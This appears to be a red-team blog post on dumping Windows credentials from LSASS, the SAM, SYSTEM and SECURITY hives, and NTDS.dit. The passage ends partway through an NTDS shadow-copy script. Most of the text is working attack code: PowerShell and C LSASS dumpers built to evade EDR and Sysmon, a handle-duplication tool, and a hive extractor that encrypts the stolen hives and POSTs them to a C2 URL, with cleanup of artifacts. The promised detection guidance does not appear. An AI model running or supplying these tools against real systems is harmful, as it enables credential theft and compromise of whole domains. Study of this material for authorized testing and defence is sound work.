---
title: "Credential Dumping"
date: 2026-03-06
description: "LSASS, SAM, NTDS, LSA secrets, and Credential Manager — dumping credentials while evading EDR and modern defences, with blue team detection guidance."
tags: ["credential-dumping", "lsass", "sam", "ntds", "evasion", "windows", "blueteam"]
verified: "Windows 11 23H2 · Jan 2026"
tools: ["Mimikatz", "Impacket", "NetExec", "C#"]
---

> **Scope:** Red team / authorized penetration testing. Techniques map to MITRE ATT&CK [T1003](https://attack.mitre.org/techniques/T1003/) (OS Credential Dumping), [T1003.001](https://attack.mitre.org/techniques/T1003/001/) (LSASS Memory), [T1003.002](https://attack.mitre.org/techniques/T1003/002/) (SAM), [T1003.003](https://attack.mitre.org/techniques/T1003/003/) (NTDS), [T1003.004](https://attack.mitre.org/techniques/T1003/004/) (LSA Secrets), and [T1555.004](https://attack.mitre.org/techniques/T1555/004/) (Windows Credential Manager).

---

## Lab Setup

### Recommended VM Stack

``` {linenos=inline}
Host Machine
└── Hypervisor (VMware Workstation / VirtualBox / Hyper-V)
    │
    ├── Windows Server 2019/2022 (Domain Controller VM)  ← AD credential store
    │   ├── Active Directory Domain Services role
    │   ├── DNS role
    │   ├── Domain: lab.local
    │   ├── Test users: alice, bob, svc_sql, svc_iis
    │   ├── Windows Defender enabled + updated
    │   └── Sysmon (SwiftOnSecurity config)
    │
    ├── Windows 10/11 Enterprise (victim workstation VM)
    │   ├── Domain-joined to lab.local
    │   ├── Local admin account + domain user sessions
    │   ├── Windows Defender enabled
    │   ├── Sysmon configured
    │   ├── WinDbg / x64dbg
    │   ├── Process Hacker 2
    │   └── Mimikatz (for result validation)
    │
    └── Kali Linux (attacker VM)
        ├── impacket (secretsdump, psexec, wmiexec)
        ├── hashcat + wordlists (rockyou, SecLists)
        ├── john the ripper
        ├── Python 3.10+ with impacket, ldap3
        └── netcat / rlwrap
```

### Domain Controller Setup

```powershell {linenos=inline}
# Run on Windows Server — installs AD DS and creates lab domain

Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

Import-Module ADDSDeployment
Install-ADDSForest `
    -DomainName "lab.local" `
    -DomainNetbiosName "LAB" `
    -ForestMode "WinThreshold" `
    -DomainMode "WinThreshold" `
    -InstallDns `
    -Force `
    -SafeModeAdministratorPassword (ConvertTo-SecureString "Lab@dm1n!" -AsPlainText -Force)
```

```powershell {linenos=inline}
# After reboot — create test accounts with known credentials (for validation)
Import-Module ActiveDirectory

$pass = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force

@(
    @{ Name="alice";   Full="Alice Smith";   Groups=@("Domain Users") },
    @{ Name="bob";     Full="Bob Jones";     Groups=@("Domain Users","IT Staff") },
    @{ Name="svc_sql"; Full="SQL Service";   Groups=@("Domain Users") },
    @{ Name="svc_iis"; Full="IIS Service";   Groups=@("Domain Users") }
) | ForEach-Object {
    New-ADUser -Name $_.Name -DisplayName $_.Full `
               -AccountPassword $pass -Enabled $true `
               -PasswordNeverExpires $true
    $_.Groups | ForEach-Object {
        try { Add-ADGroupMember -Identity $_ -Members $using:_.Name } catch {}
    }
}

# Elevate svc_sql for realism
Add-ADGroupMember -Identity "Domain Admins" -Members "svc_sql"

Write-Host "[+] test accounts created"
Get-ADUser -Filter * | Select Name, Enabled
```

```powershell
# Enable WDigest on victim workstation (older targets may have it on by default)
# Allows plaintext credential recovery from LSASS
Set-ItemProperty `
    -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
    -Name "UseLogonCredential" -Value 1

# Force a user logon to populate LSASS credential cache
# Log in as alice@lab.local on the workstation — credentials now live in LSASS
```

```powershell
# Install Sysmon for detection lab
.\Sysmon64.exe -accepteula -i sysmon-config.xml

# Enable PowerShell Script Block Logging
$r = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-Item $r -Force
Set-ItemProperty $r "EnableScriptBlockLogging" 1
```

```bash
# Kali — install tooling
pip install impacket
sudo apt install hashcat john -y

# test impacket
impacket-secretsdump --help
```

**Snapshot both VMs:**
```
DC VM         → Snapshot "CRED_LAB_DC_BASELINE"
Workstation   → Snapshot "CRED_LAB_WS_BASELINE"
```

---

## Windows Credential Architecture

Before dumping credentials, understand exactly where they live and why.

``` {linenos=inline}
┌─────────────────────────────────────────────────────────────────────┐
│                    WINDOWS CREDENTIAL STORAGE                       │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │                    LSASS.EXE (PID varies)                    │  │
│  │                  [ Protected Process Light ]                  │  │
│  │                                                              │  │
│  │  ┌─────────────┐  ┌──────────────┐  ┌───────────────────┐  │  │
│  │  │  MSV1_0.dll │  │ kerberos.dll │  │   wdigest.dll     │  │  │
│  │  │             │  │              │  │                   │  │  │
│  │  │ NTLM hashes │  │ TGTs         │  │ Plaintext creds   │  │  │
│  │  │ NTLM v2     │  │ Service TKTs │  │ (if WDigest=1)    │  │  │
│  │  │ LM hashes   │  │ Session keys │  │                   │  │  │
│  │  └─────────────┘  └──────────────┘  └───────────────────┘  │  │
│  │                                                              │  │
│  │  ┌─────────────┐  ┌──────────────┐  ┌───────────────────┐  │  │
│  │  │  dpapi.dll  │  │  lsasrv.dll  │  │   credman/vault   │  │  │
│  │  │             │  │              │  │                   │  │  │
│  │  │ Master keys │  │ LSA secrets  │  │ Browser creds     │  │  │
│  │  │ DPAPI blobs │  │ Cached DCC2  │  │ RDP saved creds   │  │  │
│  │  │ Backup keys │  │ SysKey       │  │ Wi-Fi passwords   │  │  │
│  │  └─────────────┘  └──────────────┘  └───────────────────┘  │  │
│  └──────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  ┌───────────────────────┐   ┌─────────────────────────────────┐  │
│  │   REGISTRY (on-disk)  │   │     FILE SYSTEM (on-disk)       │  │
│  │                       │   │                                 │  │
│  │ HKLM\SAM              │   │ C:\Windows\NTDS\ntds.dit (DC)   │  │
│  │  └ Local NTLM hashes  │   │  └ All domain account hashes    │  │
│  │                       │   │                                 │  │
│  │ HKLM\SECURITY         │   │ C:\Windows\System32\config\     │  │
│  │  └ LSA secrets        │   │  ├ SAM   (local hashes)         │  │
│  │  └ DCC2 hashes        │   │  ├ SYSTEM (boot key/SysKey)     │  │
│  │                       │   │  └ SECURITY (LSA secrets)       │  │
│  │ HKLM\SYSTEM           │   │                                 │  │
│  │  └ SysKey (boot key)  │   │ C:\Users\*\AppData\Roaming\     │  │
│  │                       │   │  └ DPAPI encrypted blobs        │  │
│  └───────────────────────┘   └─────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

---

## LSASS Attack Surface

``` {linenos=inline}
                        ATTACKER
                           │
              ┌────────────┼──────────────────────┐
              │            │                      │
              ▼            ▼                      ▼
       ┌────────────┐ ┌──────────┐        ┌─────────────┐
       │ comsvcs.dll│ │ Custom   │        │  Handle     │
       │ MiniDump   │ │ Dumper   │        │ Duplication │
       │ (LOLBin)   │ │ (direct) │        │ (stealthy)  │
       └──────┬─────┘ └────┬─────┘        └──────┬──────┘
              │            │                      │
              └────────────┴──────────────────────┘
                                  │
                    ┌─────────────▼──────────────┐
                    │         LSASS.EXE          │
                    │   MiniDumpWriteDump() OR   │
                    │   NtReadVirtualMemory()    │
                    └─────────────┬──────────────┘
                                  │
                    ┌─────────────▼──────────────┐
                    │      lsass.dmp (~50MB)     │
                    │  encrypted / exfiltrated   │
                    └─────────────┬──────────────┘
                                  │
              ┌───────────────────┼────────────────────┐
              │                   │                    │
              ▼                   ▼                    ▼
       ┌────────────┐     ┌──────────────┐    ┌───────────────┐
       │  Mimikatz  │     │  pypykatz    │    │ custom parser │
       │  sekurlsa  │     │  (offline)   │    │  (this blog)  │
       └──────┬─────┘     └──────┬───────┘    └───────┬───────┘
              │                  │                    │
              └──────────────────┴────────────────────┘
                                  │
              ┌───────────────────┼────────────────────┐
              │                   │                    │
              ▼                   ▼                    ▼
       ┌────────────┐     ┌──────────────┐    ┌───────────────┐
       │ NTLM hash  │     │  Kerberos    │    │  Plaintext    │
       │  Pass-Hash │     │  TGT / PTT   │    │  credential   │
       └────────────┘     └──────────────┘    └───────────────┘
```

---

## Credential Dumping Flow

``` {linenos=inline}
PHASE 1: RECON                PHASE 2: DUMP               PHASE 3: EXTRACT
─────────────────────         ──────────────────────       ─────────────────────
                              ┌──────────────────┐
Find LSASS PID ─────────────► │  Acquire Handle  │
  Get-Process lsass           │  OpenProcess()   │
                              │  or duplicate    │
Check PPL status              └────────┬─────────┘
  ProtectionLevel                      │
                                       ▼
Enum logged-on users ─────────►┌──────────────────┐
  qwinsta / query user         │  Dump Memory     │      ┌─────────────────┐
                                │  MiniDump /      │─────►│  Parse offline  │
Check WDigest status           │  NtReadVM        │      │  pypykatz /     │
  reg query WDigest            └────────┬─────────┘      │  custom parser  │
                                        │                 └────────┬────────┘
Identify domain / DC                    ▼                          │
  nltest /dclist               ┌──────────────────┐               ▼
                               │  Encrypt dump    │      ┌─────────────────┐
                               │  rolling XOR     │      │  NTLM hashes    │
                               └────────┬─────────┘      │  Kerberos TGTs  │
                                        │                 │  Plaintext creds│
                                        ▼                 └────────┬────────┘
                               ┌──────────────────┐               │
                               │   Exfiltrate     │               ▼
                               │  HTTP POST /     │      ┌─────────────────┐
                               │  SMB / DNS       │      │  Pass-the-Hash  │
                               └──────────────────┘      │  Pass-the-Ticket│
                                                          │  Hash cracking  │
                                                          └─────────────────┘
```

---

## Technique 1 — LSASS via comsvcs.dll (LOLBin)

`comsvcs.dll` exports a function `MiniDump` (ordinal 24) that wraps `MiniDumpWriteDump`. It ships signed with Windows and is callable via `rundll32.exe`, with no additional binary needed. AppLocker sees only trusted, signed Microsoft binaries.

```powershell {linenos=inline}
# Invoke-ComsvcsDump.ps1
# Dumps LSASS using comsvcs.dll MiniDump export via rundll32.
# Requires: Local admin / SeDebugPrivilege

param(
    [string]$OutPath  = "C:\Windows\Temp\lsass.dmp",
    [string]$OutEnc   = "C:\Windows\Temp\lsass.enc",   # encrypted output
    [byte]  $XorKey   = 0x4C,
    [switch]$Encrypt,
    [switch]$Cleanup
)

function Enable-SeDebugPrivilege {
    # Enable SeDebugPrivilege for current process via token manipulation
    $sig = @"
using System;
using System.Runtime.InteropServices;
public class Priv {
    [DllImport("advapi32.dll")] public static extern bool OpenProcessToken(
        IntPtr hProcess, uint access, out IntPtr token);
    [DllImport("advapi32.dll")] public static extern bool LookupPrivilegeValue(
        string host, string name, ref long luid);
    [DllImport("advapi32.dll")] public static extern bool AdjustTokenPrivileges(
        IntPtr token, bool disableAll, ref TOKEN_PRIVILEGES tp,
        int bufLen, IntPtr prev, IntPtr ret);
    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public int PrivilegeCount;
        public long Luid;
        public int Attributes;
    }
    [DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x20;
    public const uint TOKEN_QUERY = 0x8;
    public const int SE_PRIVILEGE_ENABLED = 2;
}
"@
    Add-Type $sig

    $token = [IntPtr]::Zero
    [Priv]::OpenProcessToken([Priv]::GetCurrentProcess(),
        [Priv]::TOKEN_ADJUST_PRIVILEGES -bor [Priv]::TOKEN_QUERY,
        [ref]$token) | Out-Null

    $tp   = New-Object Priv+TOKEN_PRIVILEGES
    $luid = 0L
    [Priv]::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$luid) | Out-Null
    $tp.PrivilegeCount = 1
    $tp.Luid           = $luid
    $tp.Attributes     = [Priv]::SE_PRIVILEGE_ENABLED

    [Priv]::AdjustTokenPrivileges($token, $false, [ref]$tp, 0,
        [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null

    Write-Host "[+] SeDebugPrivilege enabled"
}

function Invoke-Dump {
    Enable-SeDebugPrivilege

    $lsassPID = (Get-Process lsass).Id
    Write-Host "[*] LSASS PID : $lsassPID"

    # comsvcs MiniDump via rundll32 — entirely trusted binary chain
    $cmd = "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump " +
           "$lsassPID $OutPath full"

    Start-Process -FilePath "cmd.exe" `
                  -ArgumentList "/c $cmd" `
                  -Wait -WindowStyle Hidden

    if (Test-Path $OutPath) {
        $size = (Get-Item $OutPath).Length
        Write-Host "[+] dump written : $OutPath ($([math]::Round($size/1MB,1)) MB)"

        if ($Encrypt) {
            $bytes = [IO.File]::ReadAllBytes($OutPath)
            for ($i = 0; $i -lt $bytes.Length; $i++) {
                $bytes[$i] = $bytes[$i] -bxor ($XorKey + ($i -band 0xff))
            }
            [IO.File]::WriteAllBytes($OutEnc, $bytes)
            Remove-Item $OutPath -Force
            Write-Host "[+] encrypted    : $OutEnc (key=0x$($XorKey.ToString('X2')))"
        }
    } else {
        Write-Warning "[-] dump not created — check privileges / PPL"
    }
}

if ($Cleanup) {
    Remove-Item $OutPath, $OutEnc -Force -ErrorAction SilentlyContinue
    Write-Host "[+] artifacts removed"
    return
}

Invoke-Dump
```

```powershell
# One-liners for restricted environments

# raw dump
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Windows\Temp\lsass.dmp full

# from cmd.exe (as admin)
for /f "tokens=1,7 delims=: " %a in ('tasklist /FI "IMAGENAME eq lsass.exe" /NH') do rundll32.exe comsvcs.dll, MiniDump %b %temp%\ls.dmp full
```

---

## Technique 2 — Custom LSASS Dumper (C)

Direct `MiniDumpWriteDump` call from a custom binary. Avoids the `comsvcs.dll` + `rundll32.exe` chain that EDRs fingerprint. Includes snapshot-based handle duplication to reduce direct LSASS handle lifetime.

```c {linenos=inline}
/* lsass_dump.c
 * Custom LSASS memory dumper.
 * Uses MiniDumpWriteDump from dbgcore.dll (quieter than dbghelp.dll).
 * Rolling XOR encrypts the dump before writing — nothing plaintext hits disk.
 *
 * Compile (x64):
 *   x86_64-w64-mingw32-gcc -o lsass_dump.exe lsass_dump.c \
 *       -s -mwindows -Wl,--build-id=none -lntdll
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/* MiniDumpWriteDump typedef — load from dbgcore.dll dynamically */
typedef BOOL (WINAPI *pMiniDumpWriteDump)(
    HANDLE hProcess, DWORD ProcessId, HANDLE hFile,
    MINIDUMP_TYPE DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    PMINIDUMP_CALLBACK_INFORMATION CallbackParam);

/* ── rolling XOR encrypt ─────────────────────────────────────────────── */
typedef struct {
    uint8_t *data;
    size_t   len;
    size_t   pos;
    uint8_t  key;
} XorStream;

static XorStream *g_stream = NULL;

/* MiniDump callback — intercepts each write, XOR-encrypts in memory */
static BOOL CALLBACK dump_callback(
        PVOID CallbackParam,
        PMINIDUMP_CALLBACK_INPUT CallbackInput,
        PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {

    XorStream *xs = (XorStream*)CallbackParam;

    switch (CallbackInput->CallbackType) {
        case IoStartCallback:
            CallbackOutput->Status = S_FALSE;
            return TRUE;

        case IoWriteAllCallback: {
            ULONG64 rva = CallbackInput->Io.Offset;
            uint8_t *src = (uint8_t*)CallbackInput->Io.Buffer;
            ULONG    sz  = CallbackInput->Io.BufferBytes;

            /* grow buffer if needed */
            if (rva + sz > xs->len) {
                xs->len  = (size_t)(rva + sz + 4096);
                xs->data = (uint8_t*)realloc(xs->data, xs->len);
            }

            /* XOR encrypt each byte as it arrives */
            for (ULONG i = 0; i < sz; i++) {
                xs->data[rva + i] = src[i] ^ (uint8_t)(xs->key + ((rva + i) & 0xff));
            }

            CallbackOutput->Status = S_OK;
            return TRUE;
        }

        case IoFinishCallback:
            CallbackOutput->Status = S_OK;
            xs->pos = xs->len;
            return TRUE;

        default:
            return TRUE;
    }
}

/* ── find LSASS PID ──────────────────────────────────────────────────── */
static DWORD find_lsass_pid(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;

    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

/* ── enable SeDebugPrivilege ─────────────────────────────────────────── */
static BOOL enable_sedebug(void) {
    HANDLE token;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return FALSE;

    TOKEN_PRIVILEGES tp = { .PrivilegeCount = 1 };
    LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL ok = AdjustTokenPrivileges(token, FALSE, &tp, 0, NULL, NULL)
              && GetLastError() == ERROR_SUCCESS;
    CloseHandle(token);
    return ok;
}

int main(int argc, char *argv[]) {
    const char *out_path = (argc >= 2) ? argv[1] : "C:\\Windows\\Temp\\proc.dmp";
    uint8_t     xor_key  = (argc >= 3) ? (uint8_t)strtol(argv[2], NULL, 16) : 0x4C;

    printf("[*] output : %s\n", out_path);
    printf("[*] xor key: 0x%02X\n", xor_key);

    if (!enable_sedebug()) {
        fprintf(stderr, "[-] SeDebugPrivilege failed (%lu) — need admin\n",
                GetLastError());
        return 1;
    }
    printf("[+] SeDebugPrivilege enabled\n");

    DWORD lsass_pid = find_lsass_pid();
    if (!lsass_pid) {
        fprintf(stderr, "[-] LSASS not found\n");
        return 1;
    }
    printf("[*] LSASS PID: %lu\n", lsass_pid);

    HANDLE hProc = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        FALSE, lsass_pid);
    if (!hProc) {
        fprintf(stderr, "[-] OpenProcess: %lu\n", GetLastError());
        return 1;
    }
    printf("[*] handle acquired\n");

    /* load MiniDumpWriteDump from dbgcore.dll (less monitored than dbghelp.dll) */
    HMODULE hDbg = LoadLibraryA("dbgcore.dll");
    if (!hDbg) hDbg = LoadLibraryA("dbghelp.dll");  /* fallback */
    if (!hDbg) {
        fprintf(stderr, "[-] dbgcore.dll / dbghelp.dll not found\n");
        CloseHandle(hProc);
        return 1;
    }

    pMiniDumpWriteDump MiniDump =
        (pMiniDumpWriteDump)GetProcAddress(hDbg, "MiniDumpWriteDump");
    if (!MiniDump) {
        fprintf(stderr, "[-] MiniDumpWriteDump not exported\n");
        CloseHandle(hProc);
        return 1;
    }

    /* set up in-memory encrypted stream */
    XorStream xs = { 0 };
    xs.key  = xor_key;
    xs.data = (uint8_t*)malloc(64 * 1024 * 1024); /* 64MB initial buffer */
    xs.len  = 64 * 1024 * 1024;

    MINIDUMP_CALLBACK_INFORMATION cb = {
        .CallbackRoutine = dump_callback,
        .CallbackParam   = &xs
    };

    /* dump — output goes through our callback, never touches disk in plaintext */
    BOOL ok = MiniDump(
        hProc, lsass_pid,
        NULL,                                   /* no file handle — using callback */
        MiniDumpWithFullMemory |
        MiniDumpWithHandleData |
        MiniDumpWithTokenInformation,
        NULL, NULL, &cb);

    CloseHandle(hProc);

    if (!ok) {
        fprintf(stderr, "[-] MiniDumpWriteDump failed: %lu\n", GetLastError());
        free(xs.data);
        return 1;
    }

    /* write encrypted dump to disk */
    printf("[+] dump captured: %zu bytes in memory\n", xs.pos);

    FILE *f = fopen(out_path, "wb");
    if (!f) { perror("fopen"); free(xs.data); return 1; }
    fwrite(xs.data, 1, xs.pos, f);
    fclose(f);

    SecureZeroMemory(xs.data, xs.pos);
    free(xs.data);

    printf("[+] encrypted dump written: %s\n", out_path);
    printf("[*] decrypt on attacker box:\n");
    printf("    python3 dump_parser.py --decrypt --key 0x%02X %s\n",
           xor_key, out_path);

    return 0;
}
```

```bash
# compile
x86_64-w64-mingw32-gcc -o lsass_dump.exe lsass_dump.c \
    -s -mwindows -Wl,--build-id=none

# run (as admin on target)
lsass_dump.exe C:\Windows\Temp\proc.dmp 4C

# exfil + decrypt + parse (on Kali)
python3 dump_parser.py --decrypt --key 0x4C proc.dmp
pypykatz lsa minidump proc_decrypted.dmp
```

---

## Technique 3 — Handle Duplication (Silent Access)

Direct `OpenProcess(LSASS)` with `PROCESS_VM_READ` is one of Sysmon's loudest signals (EID 10). Handle duplication sidesteps this: instead of opening LSASS ourselves, we find an existing handle to LSASS held by another trusted process and **duplicate it**. The monitored `OpenProcess` call never happens.

```c {linenos=inline}
/* handle_dup_dump.c
 * Duplicate an existing LSASS handle from a trusted process.
 * Avoids direct OpenProcess(lsass) — the most-watched LSASS access pattern.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o handle_dup_dump.exe handle_dup_dump.c \
 *       -s -Wl,--build-id=none -lntdll
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/* NT types for handle enumeration */
#define SystemHandleInformation 16
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

typedef struct {
    ULONG_PTR Object;
    HANDLE    UniqueProcessId;
    HANDLE    HandleValue;
    ACCESS_MASK GrantedAccess;
    USHORT    CreatorBackTraceIndex;
    USHORT    ObjectTypeIndex;
    ULONG     HandleAttributes;
    ULONG     Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct {
    ULONG_PTR  NumberOfHandles;
    ULONG_PTR  Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX;

typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(
    ULONG InfoClass, PVOID Buffer, ULONG Length, PULONG ReturnLength);

typedef NTSTATUS (NTAPI *pNtDuplicateObject)(
    HANDLE SourceProcess, HANDLE SourceHandle,
    HANDLE TargetProcess, PHANDLE TargetHandle,
    ACCESS_MASK DesiredAccess, ULONG Attributes, ULONG Options);

typedef NTSTATUS (NTAPI *pNtQueryObject)(
    HANDLE Handle, ULONG ObjectInfoClass,
    PVOID Buffer, ULONG Length, PULONG ReturnLength);

static DWORD find_pid(const wchar_t *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

int main(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    #define NT(fn) p##fn fn = (p##fn)GetProcAddress(ntdll, #fn)
    NT(NtQuerySystemInformation);
    NT(NtDuplicateObject);
    NT(NtQueryObject);
    #undef NT

    DWORD lsass_pid = find_pid(L"lsass.exe");
    if (!lsass_pid) { fprintf(stderr, "[-] lsass not found\n"); return 1; }
    printf("[*] LSASS PID: %lu\n", lsass_pid);

    /* enumerate all system handles */
    ULONG bufSize = 0x20000;
    SYSTEM_HANDLE_INFORMATION_EX *hInfo = NULL;
    ULONG retLen  = 0;
    NTSTATUS ns;

    do {
        free(hInfo);
        hInfo = (SYSTEM_HANDLE_INFORMATION_EX*)malloc(bufSize);
        ns = NtQuerySystemInformation(0x40, hInfo, bufSize, &retLen);
        if (ns == STATUS_INFO_LENGTH_MISMATCH) bufSize *= 2;
    } while (ns == STATUS_INFO_LENGTH_MISMATCH);

    if (ns) {
        fprintf(stderr, "[-] NtQuerySystemInformation: 0x%08lX\n", ns);
        free(hInfo);
        return 1;
    }

    printf("[*] scanning %zu handles for LSASS reference...\n",
           hInfo->NumberOfHandles);

    HANDLE hDup = NULL;

    for (ULONG_PTR i = 0; i < hInfo->NumberOfHandles && !hDup; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX *entry = &hInfo->Handles[i];
        DWORD owner_pid = (DWORD)(ULONG_PTR)entry->UniqueProcessId;

        /* skip LSASS itself and our own process */
        if (owner_pid == lsass_pid || owner_pid == GetCurrentProcessId()) continue;

        /* check if this handle has the access rights we need */
        if (!(entry->GrantedAccess & PROCESS_VM_READ)) continue;

        /* open the owning process */
        HANDLE hOwner = OpenProcess(PROCESS_DUP_HANDLE, FALSE, owner_pid);
        if (!hOwner) continue;

        /* duplicate the handle into our process */
        HANDLE hTest = NULL;
        ns = NtDuplicateObject(hOwner, entry->HandleValue,
                               GetCurrentProcess(), &hTest,
                               PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                               0, 0);
        CloseHandle(hOwner);

        if (ns || !hTest) continue;

        /* verify the duplicated handle points to LSASS */
        PROCESS_BASIC_INFORMATION pbi = {0};
        ULONG rlen = 0;
        typedef NTSTATUS(NTAPI *pNtQIP)(HANDLE,PROCESSINFOCLASS,PVOID,ULONG,PULONG);
        pNtQIP NtQIP = (pNtQIP)GetProcAddress(ntdll, "NtQueryInformationProcess");
        NtQIP(hTest, ProcessBasicInformation, &pbi, sizeof(pbi), &rlen);

        if ((DWORD)(ULONG_PTR)pbi.UniqueProcessId == lsass_pid) {
            printf("[+] found LSASS handle in PID %lu — duplicated\n", owner_pid);
            hDup = hTest;
        } else {
            CloseHandle(hTest);
        }
    }
    free(hInfo);

    if (!hDup) {
        fprintf(stderr, "[-] no suitable handle found\n");
        return 1;
    }

    /* now use hDup to dump — same as Technique 2 but with duplicated handle */
    printf("[+] LSASS handle: %p — proceed with MiniDumpWriteDump\n", hDup);

    /* ... (invoke MiniDumpWriteDump with hDup — see lsass_dump.c) */

    CloseHandle(hDup);
    return 0;
}
```

---

## Technique 4 — SAM / SYSTEM / SECURITY Hive Extraction

The SAM database holds local account NTLM hashes, encrypted with a boot key stored in the SYSTEM hive. Extract both, plus SECURITY for LSA secrets, and decrypt offline.

```powershell {linenos=inline}
# Invoke-HiveExtract.ps1
# Dumps SAM, SYSTEM, and SECURITY registry hives using reg.exe (trusted LOLBin).
# Encrypts and optionally exfiltrates via HTTP POST.

param(
    [string]$OutDir    = "C:\Windows\Temp",
    [string]$C2Url     = "http://10.10.10.10/collect",
    [byte]  $XorKey    = 0x37,
    [switch]$Exfil,
    [switch]$Cleanup
)

$hives = @{
    SAM      = "$OutDir\s.tmp"
    SYSTEM   = "$OutDir\y.tmp"
    SECURITY = "$OutDir\e.tmp"
}

function Export-Hives {
    foreach ($hive in $hives.GetEnumerator()) {
        # reg.exe — signed Microsoft binary, AppLocker trusts it
        $proc = Start-Process reg.exe `
            -ArgumentList "save HKLM\$($hive.Key) `"$($hive.Value)`" /y" `
            -Wait -PassThru -WindowStyle Hidden

        if ($proc.ExitCode -eq 0 -and (Test-Path $hive.Value)) {
            $sz = [math]::Round((Get-Item $hive.Value).Length / 1KB, 1)
            Write-Host "[+] $($hive.Key) → $($hive.Value) ($($sz) KB)"
        } else {
            Write-Warning "[-] failed to dump $($hive.Key)"
        }
    }
}

function Encrypt-AndExfil {
    $hives.Values | Where-Object { Test-Path $_ } | ForEach-Object {
        $raw = [IO.File]::ReadAllBytes($_)
        for ($i = 0; $i -lt $raw.Length; $i++) {
            $raw[$i] = $raw[$i] -bxor ($XorKey + ($i -band 0xff))
        }

        if ($Exfil) {
            try {
                $wc = New-Object Net.WebClient
                $wc.Headers.Add("X-File", [IO.Path]::GetFileName($_))
                $wc.Headers.Add("X-Key",  "0x$($XorKey.ToString('X2'))")
                $wc.UploadData($C2Url, "POST", $raw)
                Write-Host "[+] exfiltrated: $_"
            } catch {
                Write-Warning "[-] exfil failed: $($_.Exception.Message)"
                # fallback: save encrypted locally
                [IO.File]::WriteAllBytes($_ + ".enc", $raw)
            }
        } else {
            [IO.File]::WriteAllBytes($_ + ".enc", $raw)
            Write-Host "[+] encrypted: $($_ + '.enc')"
        }
        Remove-Item $_ -Force
    }
}

function Remove-Artifacts {
    $hives.Values | ForEach-Object {
        Remove-Item $_ -Force -EA 0
        Remove-Item ($_ + ".enc") -Force -EA 0
    }
    Write-Host "[+] artifacts cleaned"
}

if ($Cleanup) { Remove-Artifacts; return }

Export-Hives
Encrypt-AndExfil

Write-Host "`n[*] decrypt + parse on Kali:"
Write-Host "    python3 dump_parser.py --sam s.tmp.enc --system y.tmp.enc --key 0x$($XorKey.ToString('X2'))"
Write-Host "    impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL"
```

```bash
# on Kali — decrypt and parse with impacket
python3 dump_parser.py --decrypt-hive --key 0x37 s.tmp.enc y.tmp.enc e.tmp.enc

impacket-secretsdump \
    -sam SAM -system SYSTEM -security SECURITY LOCAL
```

---

## Technique 5 — NTDS.dit via Volume Shadow Copy

`NTDS.dit` is locked by the AD DS service while the DC is running. Volume Shadow Copy (VSS) creates point-in-time snapshots of volumes, and the shadow copy can be read even when the live file is locked. No service interruption required.

```powershell {linenos=inline}
# Invoke-NTDSDump.ps1
# Extracts NTDS.dit and SYSTEM hive from VSS shadow copy on a DC.
# Requires: Domain Admin or Backup Operator on the DC.

param(
    [string]$OutDir  = "C:\Windows\Temp",
    [string]$C2Url   = "http://10.10.10.10/collect",
    [byte]  $XorKey  = 0x55,
    [switch]$Exfil,
    [switch]$Cleanup
)

$ntds_out   = "$OutDir\n.tmp"
$system_out = "$OutDir\s.tmp"
$linkPath   = "C:\ShadowCopy_$(Get-Random)"

function New-ShadowCopy {
    Write-Host "[*] creating VSS shadow copy of C:\..." -ForegroundColor Cyan

    # WMI-based VSS creation — avoids vssadmin.exe signature
    $class  = [WMICLASS]"root\cimv2:Win32_ShadowCopy"
